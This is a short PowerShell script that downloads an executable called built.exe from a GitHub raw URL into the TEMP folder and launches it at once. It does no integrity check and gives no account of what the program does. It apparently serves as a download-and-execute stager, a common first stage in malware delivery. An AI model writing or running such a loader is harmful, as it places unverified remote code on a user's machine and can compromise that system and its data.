# Define the URL and output file path
$url = 'https://github.com/0rx1/workshopdeffy/raw/main/built.exe'
$output = "$env:TEMP\built.exe"

# Try to download the file
try {
    Invoke-WebRequest -Uri $url -OutFile $output

    # Check if the file was downloaded successfully
    if (Test-Path $output) {
        # Start the downloaded executable
        Start-Process $output
    } else {
        Write-Error "File download failed. $output not found."
    }
} catch {
    Write-Error "An error occurred: $_"
}
